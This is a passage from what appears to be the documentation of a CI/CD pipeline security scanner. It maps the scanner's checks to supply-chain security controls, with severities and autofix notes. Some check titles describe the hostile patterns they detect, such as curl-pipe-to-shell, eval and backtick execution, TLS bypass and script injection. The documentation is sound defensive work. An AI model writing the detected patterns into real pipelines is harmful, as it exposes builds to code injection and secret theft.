| [`CC-011`](#detail-cc-011) | No store_test_results step (test results not archived) | <span class="pg-sev pg-sev--low">LOW</span> | [CircleCI](../providers/circleci.md) |  |
| [`GCB-006`](#detail-gcb-006) | Dangerous shell idiom (eval, sh -c variable, backtick exec) | <span class="pg-sev pg-sev--high">HIGH</span> | [Cloud Build](../providers/cloudbuild.md) |  |
| [`GCB-017`](#detail-gcb-017) | Image-producing build does not request SLSA provenance | <span class="pg-sev pg-sev--medium">MEDIUM</span> | [Cloud Build](../providers/cloudbuild.md) |  |
| [`S3-004`](#detail-s3-004) | Artifact bucket access logging not enabled | <span class="pg-sev pg-sev--low">LOW</span> | [AWS](../providers/aws.md) |  |

### 2.3.8: Ensure pipeline configuration files are reviewed before execution { #ctrl-2-3-8 }

**Evidenced by 16 checks** across 11 providers (AWS, Argo Workflows, Azure DevOps, Bitbucket, Buildkite, CircleCI, Cloud Build, GitHub Actions, GitLab CI, Helm, Tekton).

| Check | Title | Severity | Provider | Fix |
|-------|-------|----------|----------|-----|
| [`ADO-002`](#detail-ado-002) | Script injection via attacker-controllable context | <span class="pg-sev pg-sev--high">HIGH</span> | [Azure DevOps](../providers/azure.md) |  |
| [`ARGO-005`](#detail-argo-005) | Argo input parameter interpolated unsafely in script / args | <span class="pg-sev pg-sev--critical">CRITICAL</span> | [Argo Workflows](../providers/argo.md) |  |
| [`BB-002`](#detail-bb-002) | Script injection via attacker-controllable context | <span class="pg-sev pg-sev--high">HIGH</span> | [Bitbucket](../providers/bitbucket.md) |  |
| [`BK-003`](#detail-bk-003) | Untrusted Buildkite variable interpolated in command | <span class="pg-sev pg-sev--high">HIGH</span> | [Buildkite](../providers/buildkite.md) |  |
| [`BK-007`](#detail-bk-007) | Deploy step not gated by a manual block / input | <span class="pg-sev pg-sev--medium">MEDIUM</span> | [Buildkite](../providers/buildkite.md) |  |
| [`CB-007`](#detail-cb-007) | CodeBuild webhook has no filter group | <span class="pg-sev pg-sev--medium">MEDIUM</span> | [AWS](../providers/aws.md) |  |
| [`CC-009`](#detail-cc-009) | Deploy job missing manual approval gate | <span class="pg-sev pg-sev--medium">MEDIUM</span> | [CircleCI](../providers/circleci.md) |  |
| [`CC-013`](#detail-cc-013) | Deploy job in workflow has no branch filter | <span class="pg-sev pg-sev--medium">MEDIUM</span> | [CircleCI](../providers/circleci.md) |  |
| [`CP-001`](#detail-cp-001) | No approval action before deploy stages | <span class="pg-sev pg-sev--high">HIGH</span> | [AWS](../providers/aws.md) |  |
| [`CP-003`](#detail-cp-003) | Source stage using polling instead of event-driven trigger | <span class="pg-sev pg-sev--low">LOW</span> | [AWS](../providers/aws.md) |  |
| [`GCB-014`](#detail-gcb-014) | Build logging disabled (options.logging: NONE) | <span class="pg-sev pg-sev--high">HIGH</span> | [Cloud Build](../providers/cloudbuild.md) | <span class="pg-fix" title="`--fix` will patch this rule">🔧 fix</span> |
| [`GCB-022`](#detail-gcb-022) | options.substitutionOption set to ALLOW_LOOSE | <span class="pg-sev pg-sev--low">LOW</span> | [Cloud Build](../providers/cloudbuild.md) | <span class="pg-fix" title="`--fix` will patch this rule">🔧 fix</span> |
| [`GHA-002`](#detail-gha-002) | pull_request_target checks out PR head | <span class="pg-sev pg-sev--critical">CRITICAL</span> | [GitHub Actions](../providers/github.md) | <span class="pg-fix" title="`--fix` will patch this rule">🔧 fix</span> |
| [`GL-002`](#detail-gl-002) | Script injection via untrusted commit/MR context | <span class="pg-sev pg-sev--high">HIGH</span> | [GitLab CI](../providers/gitlab.md) |  |
| [`HELM-006`](#detail-helm-006) | Chart.yaml does not declare a kubeVersion compatibility range | <span class="pg-sev pg-sev--low">LOW</span> | [Helm](../providers/helm.md) |  |
| [`TKN-003`](#detail-tkn-003) | Tekton param interpolated unsafely in step script | <span class="pg-sev pg-sev--critical">CRITICAL</span> | [Tekton](../providers/tekton.md) |  |

### 2.4.2: Ensure pipeline integrity, artifacts are signed by the pipeline { #ctrl-2-4-2 }

**Evidenced by 4 checks** across 2 providers (AWS, Cloud Build).

| Check | Title | Severity | Provider | Fix |
|-------|-------|----------|----------|-----|
| [`CP-002`](#detail-cp-002) | Artifact store not encrypted with customer-managed KMS key | <span class="pg-sev pg-sev--medium">MEDIUM</span> | [AWS](../providers/aws.md) |  |
| [`GCB-008`](#detail-gcb-008) | No vulnerability scanning step in Cloud Build pipeline | <span class="pg-sev pg-sev--medium">MEDIUM</span> | [Cloud Build](../providers/cloudbuild.md) |  |
| [`GCB-015`](#detail-gcb-015) | SBOM not produced (no CycloneDX / syft / Trivy-SBOM step) | <span class="pg-sev pg-sev--medium">MEDIUM</span> | [Cloud Build](../providers/cloudbuild.md) |  |
| [`GCB-023`](#detail-gcb-023) | Step references a user substitution not declared in substitutions: | <span class="pg-sev pg-sev--medium">MEDIUM</span> | [Cloud Build](../providers/cloudbuild.md) |  |

### 2.4.3: Ensure access to the pipeline execution environment is restricted { #ctrl-2-4-3 }

**Evidenced by 17 checks** across 9 providers (AWS, Argo Workflows, Azure DevOps, Bitbucket, CircleCI, Cloud Build, GitHub Actions, GitLab CI, Tekton).

| Check | Title | Severity | Provider | Fix |
|-------|-------|----------|----------|-----|
| [`ADO-003`](#detail-ado-003) | Variables contain literal secret values | <span class="pg-sev pg-sev--critical">CRITICAL</span> | [Azure DevOps](../providers/azure.md) |  |
| [`ARGO-003`](#detail-argo-003) | Argo workflow uses the default ServiceAccount | <span class="pg-sev pg-sev--medium">MEDIUM</span> | [Argo Workflows](../providers/argo.md) |  |
| [`BB-003`](#detail-bb-003) | Variables contain literal secret values | <span class="pg-sev pg-sev--critical">CRITICAL</span> | [Bitbucket](../providers/bitbucket.md) |  |
| [`CB-001`](#detail-cb-001) | Secrets in plaintext environment variables | <span class="pg-sev pg-sev--critical">CRITICAL</span> | [AWS](../providers/aws.md) |  |
| [`CC-004`](#detail-cc-004) | Secret-like environment variable not managed via context | <span class="pg-sev pg-sev--medium">MEDIUM</span> | [CircleCI](../providers/circleci.md) |  |
| [`CC-008`](#detail-cc-008) | Credential-shaped literal in config body | <span class="pg-sev pg-sev--critical">CRITICAL</span> | [CircleCI](../providers/circleci.md) | <span class="pg-fix" title="`--fix` will patch this rule">🔧 fix</span> |
| [`GCB-026`](#detail-gcb-026) | Step waitFor: references an unknown step id | <span class="pg-sev pg-sev--medium">MEDIUM</span> | [Cloud Build](../providers/cloudbuild.md) |  |
| [`GHA-004`](#detail-gha-004) | Workflow has no explicit permissions block | <span class="pg-sev pg-sev--medium">MEDIUM</span> | [GitHub Actions](../providers/github.md) | <span class="pg-fix" title="`--fix` will patch this rule">🔧 fix</span> |
| [`GL-003`](#detail-gl-003) | Variables contain literal secret values | <span class="pg-sev pg-sev--critical">CRITICAL</span> | [GitLab CI](../providers/gitlab.md) |  |
| [`IAM-001`](#detail-iam-001) | CI/CD role has AdministratorAccess policy attached | <span class="pg-sev pg-sev--critical">CRITICAL</span> | [AWS](../providers/aws.md) |  |
| [`IAM-002`](#detail-iam-002) | CI/CD role has wildcard Action in attached policy | <span class="pg-sev pg-sev--high">HIGH</span> | [AWS](../providers/aws.md) |  |
| [`IAM-003`](#detail-iam-003) | CI/CD role has no permission boundary | <span class="pg-sev pg-sev--medium">MEDIUM</span> | [AWS](../providers/aws.md) |  |
| [`IAM-004`](#detail-iam-004) | CI/CD role can PassRole to any role | <span class="pg-sev pg-sev--high">HIGH</span> | [AWS](../providers/aws.md) |  |
| [`IAM-005`](#detail-iam-005) | CI/CD role trust policy missing sts:ExternalId | <span class="pg-sev pg-sev--high">HIGH</span> | [AWS](../providers/aws.md) |  |
| [`IAM-006`](#detail-iam-006) | Sensitive actions granted with wildcard Resource | <span class="pg-sev pg-sev--medium">MEDIUM</span> | [AWS](../providers/aws.md) |  |
| [`PBAC-002`](#detail-pbac-002) | CodeBuild service role shared across multiple projects | <span class="pg-sev pg-sev--medium">MEDIUM</span> | [AWS](../providers/aws.md) |  |
| [`TKN-007`](#detail-tkn-007) | Tekton run uses the default ServiceAccount | <span class="pg-sev pg-sev--medium">MEDIUM</span> | [Tekton](../providers/tekton.md) |  |

### 3.1.3: Ensure signed metadata of dependencies is verified { #ctrl-3-1-3 }

**Evidenced by 25 checks** across 10 providers (AWS, Argo Workflows, Buildkite, CircleCI, Cloud Build, Dockerfile, GitHub Actions, GitLab CI, Helm, Tekton).

| Check | Title | Severity | Provider | Fix |
|-------|-------|----------|----------|-----|
| [`ARGO-001`](#detail-argo-001) | Argo template container image not pinned to a digest | <span class="pg-sev pg-sev--high">HIGH</span> | [Argo Workflows](../providers/argo.md) |  |
| [`ARGO-012`](#detail-argo-012) | No vulnerability scanning step | <span class="pg-sev pg-sev--medium">MEDIUM</span> | [Argo Workflows](../providers/argo.md) |  |
| [`BK-008`](#detail-bk-008) | TLS verification disabled in step command | <span class="pg-sev pg-sev--medium">MEDIUM</span> | [Buildkite](../providers/buildkite.md) | <span class="pg-fix" title="`--fix` will patch this rule">🔧 fix</span> |
| [`BK-012`](#detail-bk-012) | No vulnerability scanning step | <span class="pg-sev pg-sev--medium">MEDIUM</span> | [Buildkite](../providers/buildkite.md) |  |
| [`CC-020`](#detail-cc-020) | No vulnerability scanning step | <span class="pg-sev pg-sev--medium">MEDIUM</span> | [CircleCI](../providers/circleci.md) |  |
| [`CC-021`](#detail-cc-021) | Package install without lockfile enforcement | <span class="pg-sev pg-sev--medium">MEDIUM</span> | [CircleCI](../providers/circleci.md) | <span class="pg-fix" title="`--fix` will patch this rule">🔧 fix</span> |
| [`CC-022`](#detail-cc-022) | Dependency update command bypasses lockfile pins | <span class="pg-sev pg-sev--medium">MEDIUM</span> | [CircleCI](../providers/circleci.md) | <span class="pg-fix" title="`--fix` will patch this rule">🔧 fix</span> |
| [`DF-001`](#detail-df-001) | FROM image not pinned to sha256 digest | <span class="pg-sev pg-sev--high">HIGH</span> | [Dockerfile](../providers/dockerfile.md) | <span class="pg-fix" title="`--fix` will patch this rule">🔧 fix</span> |
| [`DF-003`](#detail-df-003) | ADD pulls remote URL without integrity verification | <span class="pg-sev pg-sev--high">HIGH</span> | [Dockerfile](../providers/dockerfile.md) |  |
| [`ECR-001`](#detail-ecr-001) | Image scanning on push not enabled | <span class="pg-sev pg-sev--high">HIGH</span> | [AWS](../providers/aws.md) |  |
| [`GCB-001`](#detail-gcb-001) | Cloud Build step image not pinned by digest | <span class="pg-sev pg-sev--high">HIGH</span> | [Cloud Build](../providers/cloudbuild.md) | <span class="pg-fix" title="`--fix` will patch this rule">🔧 fix</span> |
| [`GCB-004`](#detail-gcb-004) | dynamicSubstitutions on with user substitutions in step args | <span class="pg-sev pg-sev--high">HIGH</span> | [Cloud Build](../providers/cloudbuild.md) |  |
| [`GCB-007`](#detail-gcb-007) | availableSecrets references ``versions/latest`` | <span class="pg-sev pg-sev--medium">MEDIUM</span> | [Cloud Build](../providers/cloudbuild.md) | <span class="pg-fix" title="`--fix` will patch this rule">🔧 fix</span> |
| [`GHA-040`](#detail-gha-040) | Action reference matches a known-compromised SHA or tag | <span class="pg-sev pg-sev--critical">CRITICAL</span> | [GitHub Actions](../providers/github.md) |  |
| [`GHA-041`](#detail-gha-041) | Action upstream repo has a single contributor | <span class="pg-sev pg-sev--medium">MEDIUM</span> | [GitHub Actions](../providers/github.md) |  |
| [`GHA-042`](#detail-gha-042) | Action upstream repo is newly created | <span class="pg-sev pg-sev--medium">MEDIUM</span> | [GitHub Actions](../providers/github.md) |  |
| [`GHA-043`](#detail-gha-043) | Low-star action runs with sensitive permissions | <span class="pg-sev pg-sev--high">HIGH</span> | [GitHub Actions](../providers/github.md) |  |
| [`GHA-047`](#detail-gha-047) | Action ref resolves to a recently committed tag or SHA | <span class="pg-sev pg-sev--medium">MEDIUM</span> | [GitHub Actions](../providers/github.md) |  |
| [`GL-005`](#detail-gl-005) | include: pulls remote / project without pinned ref | <span class="pg-sev pg-sev--high">HIGH</span> | [GitLab CI](../providers/gitlab.md) |  |
| [`HELM-001`](#detail-helm-001) | Chart.yaml declares legacy apiVersion: v1 | <span class="pg-sev pg-sev--medium">MEDIUM</span> | [Helm](../providers/helm.md) | <span class="pg-fix" title="`--fix` will patch this rule">🔧 fix</span> |
| [`HELM-002`](#detail-helm-002) | Chart.lock missing per-dependency digests | <span class="pg-sev pg-sev--high">HIGH</span> | [Helm](../providers/helm.md) | <span class="pg-fix" title="`--fix` will patch this rule">🔧 fix</span> |
| [`HELM-004`](#detail-helm-004) | Chart dependency version is a range, not an exact pin | <span class="pg-sev pg-sev--medium">MEDIUM</span> | [Helm](../providers/helm.md) |  |
| [`HELM-008`](#detail-helm-008) | Chart.lock generated more than 90 days ago | <span class="pg-sev pg-sev--medium">MEDIUM</span> | [Helm](../providers/helm.md) |  |
| [`TKN-001`](#detail-tkn-001) | Tekton step image not pinned to a digest | <span class="pg-sev pg-sev--high">HIGH</span> | [Tekton](../providers/tekton.md) |  |
| [`TKN-012`](#detail-tkn-012) | No vulnerability scanning step | <span class="pg-sev pg-sev--medium">MEDIUM</span> | [Tekton](../providers/tekton.md) |  |

### 3.1.5: Ensure only trusted package managers and repositories are used { #ctrl-3-1-5 }

**Evidenced by 20 checks** across 11 providers (Argo Workflows, Azure DevOps, Bitbucket, Buildkite, CircleCI, Cloud Build, Dockerfile, GitHub Actions, GitLab CI, Helm, Tekton).

| Check | Title | Severity | Provider | Fix |
|-------|-------|----------|----------|-----|
| [`ADO-001`](#detail-ado-001) | Task reference not pinned to specific version | <span class="pg-sev pg-sev--high">HIGH</span> | [Azure DevOps](../providers/azure.md) | <span class="pg-fix" title="`--fix` will patch this rule">🔧 fix</span> |
| [`ADO-005`](#detail-ado-005) | Container image not pinned to specific version | <span class="pg-sev pg-sev--high">HIGH</span> | [Azure DevOps](../providers/azure.md) |  |
| [`ARGO-008`](#detail-argo-008) | Argo script source pipes remote install or disables TLS | <span class="pg-sev pg-sev--high">HIGH</span> | [Argo Workflows](../providers/argo.md) | <span class="pg-fix" title="`--fix` will patch this rule">🔧 fix</span> |
| [`BB-001`](#detail-bb-001) | pipe: action not pinned to exact version | <span class="pg-sev pg-sev--high">HIGH</span> | [Bitbucket](../providers/bitbucket.md) | <span class="pg-fix" title="`--fix` will patch this rule">🔧 fix</span> |
| [`BK-001`](#detail-bk-001) | Buildkite plugin not pinned to an exact version | <span class="pg-sev pg-sev--high">HIGH</span> | [Buildkite](../providers/buildkite.md) |  |
| [`BK-004`](#detail-bk-004) | Remote script piped into shell interpreter | <span class="pg-sev pg-sev--high">HIGH</span> | [Buildkite](../providers/buildkite.md) | <span class="pg-fix" title="`--fix` will patch this rule">🔧 fix</span> |
| [`CC-001`](#detail-cc-001) | Orb not pinned to exact semver | <span class="pg-sev pg-sev--high">HIGH</span> | [CircleCI](../providers/circleci.md) | <span class="pg-fix" title="`--fix` will patch this rule">🔧 fix</span> |
| [`CC-003`](#detail-cc-003) | Docker image not pinned by digest | <span class="pg-sev pg-sev--high">HIGH</span> | [CircleCI](../providers/circleci.md) |  |
| [`CC-016`](#detail-cc-016) | Remote script piped to shell interpreter | <span class="pg-sev pg-sev--high">HIGH</span> | [CircleCI](../providers/circleci.md) | <span class="pg-fix" title="`--fix` will patch this rule">🔧 fix</span> |
| [`CC-018`](#detail-cc-018) | Package install from insecure source | <span class="pg-sev pg-sev--high">HIGH</span> | [CircleCI](../providers/circleci.md) | <span class="pg-fix" title="`--fix` will patch this rule">🔧 fix</span> |
| [`CC-023`](#detail-cc-023) | TLS / certificate verification bypass | <span class="pg-sev pg-sev--high">HIGH</span> | [CircleCI](../providers/circleci.md) | <span class="pg-fix" title="`--fix` will patch this rule">🔧 fix</span> |
| [`DF-004`](#detail-df-004) | RUN executes a remote script via curl-pipe / wget-pipe | <span class="pg-sev pg-sev--high">HIGH</span> | [Dockerfile](../providers/dockerfile.md) |  |
| [`GCB-011`](#detail-gcb-011) | TLS / certificate verification bypass | <span class="pg-sev pg-sev--high">HIGH</span> | [Cloud Build](../providers/cloudbuild.md) | <span class="pg-fix" title="`--fix` will patch this rule">🔧 fix</span> |
| [`GCB-018`](#detail-gcb-018) | Legacy KMS secrets block in use (prefer availableSecrets / Secret Manager) | <span class="pg-sev pg-sev--medium">MEDIUM</span> | [Cloud Build](../providers/cloudbuild.md) |  |
| [`GHA-001`](#detail-gha-001) | Action not pinned to commit SHA | <span class="pg-sev pg-sev--high">HIGH</span> | [GitHub Actions](../providers/github.md) | <span class="pg-fix" title="`--fix` will patch this rule">🔧 fix</span> |
| [`GL-001`](#detail-gl-001) | Image not pinned to specific version or digest | <span class="pg-sev pg-sev--high">HIGH</span> | [GitLab CI](../providers/gitlab.md) | <span class="pg-fix" title="`--fix` will patch this rule">🔧 fix</span> |
| [`GL-005`](#detail-gl-005) | include: pulls remote / project without pinned ref | <span class="pg-sev pg-sev--high">HIGH</span> | [GitLab CI](../providers/gitlab.md) |  |
| [`HELM-003`](#detail-helm-003) | Chart dependency declared on a non-HTTPS repository | <span class="pg-sev pg-sev--high">HIGH</span> | [Helm](../providers/helm.md) | <span class="pg-fix" title="`--fix` will patch this rule">🔧 fix</span> |
| [`HELM-009`](#detail-helm-009) | Chart home / sources URL uses a non-HTTPS scheme | <span class="pg-sev pg-sev--low">LOW</span> | [Helm](../providers/helm.md) |  |
| [`TKN-008`](#detail-tkn-008) | Tekton step script pipes remote install or disables TLS | <span class="pg-sev pg-sev--high">HIGH</span> | [Tekton](../providers/tekton.md) | <span class="pg-fix" title="`--fix` will patch this rule">🔧 fix</span> |

### 4.1.1: Ensure all artifacts on all releases are verified (signed, integrity-checked) { #ctrl-4-1-1 }

**Evidenced by 17 checks** across 10 providers (AWS, Argo Workflows, Azure DevOps, Bitbucket, Buildkite, CircleCI, GitHub Actions, GitLab CI, Helm, Tekton).

| Check | Title | Severity | Provider | Fix |
|-------|-------|----------|----------|-----|
| [`ADO-006`](#detail-ado-006) | Artifacts not signed | <span class="pg-sev pg-sev--medium">MEDIUM</span> | [Azure DevOps](../providers/azure.md) |  |
| [`ARGO-009`](#detail-argo-009) | Artifacts not signed (no cosign/sigstore step) | <span class="pg-sev pg-sev--medium">MEDIUM</span> | [Argo Workflows](../providers/argo.md) |  |
| [`ARGO-011`](#detail-argo-011) | No SLSA provenance attestation produced | <span class="pg-sev pg-sev--medium">MEDIUM</span> | [Argo Workflows](../providers/argo.md) |  |
| [`BB-006`](#detail-bb-006) | Artifacts not signed | <span class="pg-sev pg-sev--medium">MEDIUM</span> | [Bitbucket](../providers/bitbucket.md) |  |
| [`BK-009`](#detail-bk-009) | Artifacts not signed (no cosign/sigstore step) | <span class="pg-sev pg-sev--medium">MEDIUM</span> | [Buildkite](../providers/buildkite.md) |  |
| [`BK-011`](#detail-bk-011) | No SLSA provenance attestation produced | <span class="pg-sev pg-sev--medium">MEDIUM</span> | [Buildkite](../providers/buildkite.md) |  |
| [`CC-006`](#detail-cc-006) | Artifacts not signed (no cosign/sigstore step) | <span class="pg-sev pg-sev--medium">MEDIUM</span> | [CircleCI](../providers/circleci.md) |  |
| [`CP-002`](#detail-cp-002) | Artifact store not encrypted with customer-managed KMS key | <span class="pg-sev pg-sev--medium">MEDIUM</span> | [AWS](../providers/aws.md) |  |
| [`ECR-002`](#detail-ecr-002) | Image tags are mutable | <span class="pg-sev pg-sev--high">HIGH</span> | [AWS](../providers/aws.md) |  |
| [`ECR-005`](#detail-ecr-005) | Repository encrypted with AES256 rather than KMS CMK | <span class="pg-sev pg-sev--medium">MEDIUM</span> | [AWS](../providers/aws.md) |  |
| [`GHA-006`](#detail-gha-006) | Artifacts not signed (no cosign/sigstore step) | <span class="pg-sev pg-sev--medium">MEDIUM</span> | [GitHub Actions](../providers/github.md) |  |
| [`GL-006`](#detail-gl-006) | Artifacts not signed | <span class="pg-sev pg-sev--medium">MEDIUM</span> | [GitLab CI](../providers/gitlab.md) |  |
| [`HELM-002`](#detail-helm-002) | Chart.lock missing per-dependency digests | <span class="pg-sev pg-sev--high">HIGH</span> | [Helm](../providers/helm.md) | <span class="pg-fix" title="`--fix` will patch this rule">🔧 fix</span> |
| [`S3-002`](#detail-s3-002) | Artifact bucket server-side encryption not configured | <span class="pg-sev pg-sev--high">HIGH</span> | [AWS](../providers/aws.md) |  |
| [`S3-003`](#detail-s3-003) | Artifact bucket versioning not enabled | <span class="pg-sev pg-sev--medium">MEDIUM</span> | [AWS](../providers/aws.md) |  |
| [`TKN-009`](#detail-tkn-009) | Artifacts not signed (no cosign/sigstore step) | <span class="pg-sev pg-sev--medium">MEDIUM</span> | [Tekton](../providers/tekton.md) |  |
| [`TKN-011`](#detail-tkn-011) | No SLSA provenance attestation produced | <span class="pg-sev pg-sev--medium">MEDIUM</span> | [Tekton](../providers/tekton.md) |  |

### 4.2.1: Ensure access to artifacts is limited { #ctrl-4-2-1 }

**Evidenced by 4 checks** across 2 providers (AWS, Cloud Build).

| Check | Title | Severity | Provider | Fix |
|-------|-------|----------|----------|-----|
| [`ECR-003`](#detail-ecr-003) | Repository policy allows public access | <span class="pg-sev pg-sev--critical">CRITICAL</span> | [AWS](../providers/aws.md) |  |
| [`GCB-020`](#detail-gcb-020) | serviceAccount points at the default Cloud Build service account | <span class="pg-sev pg-sev--high">HIGH</span> | [Cloud Build](../providers/cloudbuild.md) |  |
| [`S3-001`](#detail-s3-001) | Artifact bucket public access block not fully enabled | <span class="pg-sev pg-sev--critical">CRITICAL</span> | [AWS](../providers/aws.md) |  |
| [`S3-005`](#detail-s3-005) | Artifact bucket missing aws:SecureTransport deny | <span class="pg-sev pg-sev--medium">MEDIUM</span> | [AWS](../providers/aws.md) |  |

### 4.3.3: Ensure package registries use authentication and authorisation { #ctrl-4-3-3 }

**Evidenced by 1 check** across AWS.

| Check | Title | Severity | Provider | Fix |
|-------|-------|----------|----------|-----|
| [`ECR-003`](#detail-ecr-003) | Repository policy allows public access | <span class="pg-sev pg-sev--critical">CRITICAL</span> | [AWS](../providers/aws.md) |  |

### 4.4.1: Ensure artifacts have provenance/SBOM metadata { #ctrl-4-4-1 }

**Evidenced by 19 checks** across 12 providers (AWS, Argo Workflows, Azure DevOps, Bitbucket, Buildkite, CircleCI, Cloud Build, Dockerfile, GitHub Actions, GitLab CI, Helm, Tekton).

| Check | Title | Severity | Provider | Fix |
|-------|-------|----------|----------|-----|
| [`ADO-007`](#detail-ado-007) | SBOM not produced | <span class="pg-sev pg-sev--medium">MEDIUM</span> | [Azure DevOps](../providers/azure.md) |  |
| [`ARGO-010`](#detail-argo-010) | No SBOM generated for build artifacts | <span class="pg-sev pg-sev--medium">MEDIUM</span> | [Argo Workflows](../providers/argo.md) |  |
| [`ARGO-011`](#detail-argo-011) | No SLSA provenance attestation produced | <span class="pg-sev pg-sev--medium">MEDIUM</span> | [Argo Workflows](../providers/argo.md) |  |
| [`BB-007`](#detail-bb-007) | SBOM not produced | <span class="pg-sev pg-sev--medium">MEDIUM</span> | [Bitbucket](../providers/bitbucket.md) |  |
| [`BK-010`](#detail-bk-010) | No SBOM generated for build artifacts | <span class="pg-sev pg-sev--medium">MEDIUM</span> | [Buildkite](../providers/buildkite.md) |  |
| [`BK-011`](#detail-bk-011) | No SLSA provenance attestation produced | <span class="pg-sev pg-sev--medium">MEDIUM</span> | [Buildkite](../providers/buildkite.md) |  |
| [`CC-007`](#detail-cc-007) | SBOM not produced (no CycloneDX/syft/Trivy-SBOM step) | <span class="pg-sev pg-sev--medium">MEDIUM</span> | [CircleCI](../providers/circleci.md) |  |
| [`DF-016`](#detail-df-016) | Image lacks OCI provenance labels | <span class="pg-sev pg-sev--low">LOW</span> | [Dockerfile](../providers/dockerfile.md) |  |
| [`ECR-002`](#detail-ecr-002) | Image tags are mutable | <span class="pg-sev pg-sev--high">HIGH</span> | [AWS](../providers/aws.md) |  |
| [`GCB-009`](#detail-gcb-009) | Artifacts not signed (no cosign / sigstore step) | <span class="pg-sev pg-sev--medium">MEDIUM</span> | [Cloud Build](../providers/cloudbuild.md) |  |
| [`GCB-024`](#detail-gcb-024) | Build pushes Docker images but top-level images: is empty | <span class="pg-sev pg-sev--low">LOW</span> | [Cloud Build](../providers/cloudbuild.md) |  |
| [`GHA-007`](#detail-gha-007) | SBOM not produced (no CycloneDX/syft/Trivy-SBOM step) | <span class="pg-sev pg-sev--medium">MEDIUM</span> | [GitHub Actions](../providers/github.md) |  |
| [`GL-007`](#detail-gl-007) | SBOM not produced | <span class="pg-sev pg-sev--medium">MEDIUM</span> | [GitLab CI](../providers/gitlab.md) |  |
| [`HELM-005`](#detail-helm-005) | Chart maintainers field empty or missing chain-of-custody info | <span class="pg-sev pg-sev--low">LOW</span> | [Helm](../providers/helm.md) |  |
| [`HELM-007`](#detail-helm-007) | Chart.yaml description field is empty or missing | <span class="pg-sev pg-sev--low">LOW</span> | [Helm](../providers/helm.md) |  |
| [`HELM-010`](#detail-helm-010) | Chart.yaml appVersion field is empty or missing | <span class="pg-sev pg-sev--low">LOW</span> | [Helm](../providers/helm.md) |  |
| [`S3-003`](#detail-s3-003) | Artifact bucket versioning not enabled | <span class="pg-sev pg-sev--medium">MEDIUM</span> | [AWS](../providers/aws.md) |  |
| [`TKN-010`](#detail-tkn-010) | No SBOM generated for build artifacts | <span class="pg-sev pg-sev--medium">MEDIUM</span> | [Tekton](../providers/tekton.md) |  |
| [`TKN-011`](#detail-tkn-011) | No SLSA provenance attestation produced | <span class="pg-sev pg-sev--medium">MEDIUM</span> | [Tekton](../providers/tekton.md) |  |

### 5.1.4: Ensure deployment configuration manifests are reviewed before apply { #ctrl-5-1-4 }

**Evidenced by 8 checks** across 6 providers (AWS, Azure DevOps, Bitbucket, Buildkite, CircleCI, GitLab CI).

| Check | Title | Severity | Provider | Fix |
|-------|-------|----------|----------|-----|
| [`ADO-004`](#detail-ado-004) | Deployment job missing environment binding | <span class="pg-sev pg-sev--medium">MEDIUM</span> | [Azure DevOps](../providers/azure.md) |  |
| [`BB-004`](#detail-bb-004) | Deploy step missing `deployment:` environment gate | <span class="pg-sev pg-sev--medium">MEDIUM</span> | [Bitbucket](../providers/bitbucket.md) |  |
| [`BK-007`](#detail-bk-007) | Deploy step not gated by a manual block / input | <span class="pg-sev pg-sev--medium">MEDIUM</span> | [Buildkite](../providers/buildkite.md) |  |
| [`CC-009`](#detail-cc-009) | Deploy job missing manual approval gate | <span class="pg-sev pg-sev--medium">MEDIUM</span> | [CircleCI](../providers/circleci.md) |  |
| [`CD-001`](#detail-cd-001) | Automatic rollback on failure not enabled | <span class="pg-sev pg-sev--medium">MEDIUM</span> | [AWS](../providers/aws.md) |  |
| [`CD-002`](#detail-cd-002) | AllAtOnce deployment config, no canary or rolling strategy | <span class="pg-sev pg-sev--high">HIGH</span> | [AWS](../providers/aws.md) |  |
| [`CP-001`](#detail-cp-001) | No approval action before deploy stages | <span class="pg-sev pg-sev--high">HIGH</span> | [AWS](../providers/aws.md) |  |
| [`GL-004`](#detail-gl-004) | Deploy job lacks manual approval or environment gate | <span class="pg-sev pg-sev--medium">MEDIUM</span> | [GitLab CI](../providers/gitlab.md) |  |

### 5.2.1: Ensure deployment environments are separated { #ctrl-5-2-1 }

**Evidenced by 4 checks** across 4 providers (AWS, Azure DevOps, Bitbucket, GitLab CI).

| Check | Title | Severity | Provider | Fix |
|-------|-------|----------|----------|-----|
| [`ADO-004`](#detail-ado-004) | Deployment job missing environment binding | <span class="pg-sev pg-sev--medium">MEDIUM</span> | [Azure DevOps](../providers/azure.md) |  |
| [`BB-004`](#detail-bb-004) | Deploy step missing `deployment:` environment gate | <span class="pg-sev pg-sev--medium">MEDIUM</span> | [Bitbucket](../providers/bitbucket.md) |  |
| [`CD-002`](#detail-cd-002) | AllAtOnce deployment config, no canary or rolling strategy | <span class="pg-sev pg-sev--high">HIGH</span> | [AWS](../providers/aws.md) |  |
| [`GL-004`](#detail-gl-004) | Deploy job lacks manual approval or environment gate | <span class="pg-sev pg-sev--medium">MEDIUM</span> | [GitLab CI](../providers/gitlab.md) |  |

### 5.2.3: Ensure deployment environment activity is audited { #ctrl-5-2-3 }

**Evidenced by 2 checks** across AWS.

| Check | Title | Severity | Provider | Fix |
|-------|-------|----------|----------|-----|
| [`CD-003`](#detail-cd-003) | No CloudWatch alarm monitoring on deployment group | <span class="pg-sev pg-sev--medium">MEDIUM</span> | [AWS](../providers/aws.md) |  |
| [`S3-004`](#detail-s3-004) | Artifact bucket access logging not enabled | <span class="pg-sev pg-sev--low">LOW</span> | [AWS](../providers/aws.md) |  |

## Check details

Every check that evidences this standard, rendered once with its detection mechanism, recommendation, and any known false-positive modes or real-world incident references. The per-control tables above link to the matching block here.

#### `ADO-001`: Task reference not pinned to specific version <span class="pg-sev pg-sev--high">HIGH</span> <span class="pg-fix" title="`--fix` will patch this rule">🔧 fix</span> { #detail-ado-001 }

**Evidences:** [`1.4.1`](#ctrl-1-4-1) Ensure third-party artifacts and open-source libraries are verified, [`3.1.5`](#ctrl-3-1-5) Ensure only trusted package managers and repositories are used.

**How this is detected.** Floating-major task references (`@1`, `@2`) can roll forward silently when the task publisher ships a breaking or malicious update. Pass when every `task:` reference carries a two- or three-segment semver.

**Recommendation.** Reference tasks by a full semver (`DownloadSecureFile@1.2.3`) or extension-published-version. Track task updates explicitly via Azure DevOps extension settings rather than letting `@1` drift.

**Autofix.** `pipeline_check --fix` will patch this finding automatically. Review the diff before committing; the fixer applies the conservative remediation pattern (e.g. swap a floating tag for the digest it currently resolves to), not the most aggressive one.

**Source:** [`ADO-001`](../providers/azure.md#ado-001) in the [Azure DevOps provider](../providers/azure.md).

#### `ADO-002`: Script injection via attacker-controllable context <span class="pg-sev pg-sev--high">HIGH</span> { #detail-ado-002 }

